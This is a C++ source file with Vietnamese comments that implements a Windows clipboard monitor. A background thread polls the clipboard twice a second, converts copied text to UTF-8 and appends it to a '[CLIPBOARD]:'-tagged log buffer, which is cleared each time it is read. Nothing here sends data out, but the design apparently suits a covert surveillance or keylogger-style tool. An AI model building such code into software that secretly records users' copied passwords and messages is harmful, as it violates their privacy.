#include "Clipboard.h"
#include <iostream>

Clipboard::Clipboard() : _isRunning(false), _lastSequenceNumber(0) {}

Clipboard::~Clipboard() {
    StopMonitoring();
}

// Hàm lấy nội dung Clipboard (Hỗ trợ tiếng Việt Unicode)
std::string Clipboard::GetClipboardText() {
    // 1. Kiểm tra xem Clipboard có chứa văn bản không (bỏ qua nếu là ảnh/file)
    if (!IsClipboardFormatAvailable(CF_UNICODETEXT)) return "";

    // 2. Mở Clipboard
    if (!OpenClipboard(NULL)) return "";

    // 3. Lấy dữ liệu
    std::string result = "";
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != NULL) {
        // Khóa bộ nhớ để đọc an toàn
        WCHAR* pszText = static_cast<WCHAR*>(GlobalLock(hData));
        if (pszText != NULL) {
            // Chuyển từ WCHAR (Unicode Window) sang UTF-8 (Web)
            int bufferSize = WideCharToMultiByte(CP_UTF8, 0, pszText, -1, NULL, 0, NULL, NULL);
            if (bufferSize > 0) {
                std::vector<char> buffer(bufferSize);
                WideCharToMultiByte(CP_UTF8, 0, pszText, -1, &buffer[0], bufferSize, NULL, NULL);
                result = std::string(buffer.begin(), buffer.end() - 1); // Trừ ký tự kết thúc null
            }
            GlobalUnlock(hData);
        }
    }

    // 4. Đóng Clipboard (Bắt buộc, nếu không các app khác không copy được)
    CloseClipboard();
    return result;
}

// Vòng lặp theo dõi
void Clipboard::RunMonitorLoop() {
    // Lấy số thứ tự hiện tại làm mốc
    _lastSequenceNumber = GetClipboardSequenceNumber();

    while (_isRunning) {
        // Kiểm tra xem Clipboard có thay đổi không?
        DWORD currentSeq = GetClipboardSequenceNumber();

        if (currentSeq != _lastSequenceNumber) {
            // Đã có sự thay đổi!
            _lastSequenceNumber = currentSeq;

            std::string text = GetClipboardText();
            if (!text.empty()) {
                std::lock_guard<std::mutex> lock(_mutex);
                _logBuffer += "[CLIPBOARD]: " + text + "\n";
            }
        }

        // Nghỉ 500ms để không ngốn CPU (2 lần kiểm tra/giây)
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

void Clipboard::StartMonitoring() {
    if (_isRunning) return;
    _isRunning = true;
    _logBuffer = "";
    _monitorThread = std::thread(&Clipboard::RunMonitorLoop, this);
}

void Clipboard::StopMonitoring() {
    if (!_isRunning) return;
    _isRunning = false;
    if (_monitorThread.joinable()) {
        _monitorThread.join();
    }
}

std::string Clipboard::GetLogs() {
    std::lock_guard<std::mutex> lock(_mutex);
    if (_logBuffer.empty()) return "";
    std::string data = _logBuffer;
    _logBuffer.clear(); // Đọc xong xóa luôn cho nhẹ
    return data;
}